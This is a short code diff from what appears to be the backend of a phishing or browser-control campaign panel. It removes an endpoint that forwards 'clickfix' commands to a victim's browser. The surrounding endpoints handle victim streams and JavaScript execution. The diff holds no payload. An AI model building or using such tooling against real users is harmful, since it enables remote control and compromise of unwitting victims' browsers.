@@ -105,61 +105,6 @@ async def create_victim_stream_access(
     )
 
 
-@router.post("/{campaign_id}/victims/{victim_id}/clickfix")
-async def send_clickfix_command(
-    campaign_id: str,
-    victim_id: str,
-    request: CommandRequest,
-    db: Session = Depends(get_db),
-    current_user: User = Depends(require_campaign_write_access)
-):
-    """Send clickfix command to victim's browser"""
-
-    # ✅ Verify ownership
-    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
-
-    if not campaign:
-        raise HTTPException(403, "Not your campaign")
-
-    # ✅ Verify victim exists
-    victim = db.query(Victim).filter(
-        Victim.id == victim_id,
-        Victim.campaign_id == campaign_id
-    ).first()
-
-    if not victim:
-        raise HTTPException(404, "Victim not found")
-
-    # ✅ Send request to internal campaign API
-    internal_api_url = f"http://{campaign.container_name}:8080/api/sessions/{victim_id}/clickfix"
-    headers = campaign_internal_headers(campaign_id)
-
-    async with httpx.AsyncClient() as client:
-        try:
-            response = await client.post(
-                internal_api_url,
-                headers=headers,
-                json={"command": request.command},
-                timeout=10.0
-            )
-            response.raise_for_status()
-        except httpx.HTTPError as exc:
-            logger.exception("Campaign clickfix service request failed")
-            raise HTTPException(
-                502,
-                "Campaign service request failed",
-            ) from exc
-
-    logger.info(
-        "Clickfix command sent to victim %s in campaign %s (by %s)",
-        victim_id,
-        campaign_id,
-        current_user.username,
-    )
-
-    return {"success": True, "message": "Clickfix command sent"}
-
-
 @router.post("/{campaign_id}/victims/{victim_id}/exec")
 async def send_js_command(
     campaign_id: str,
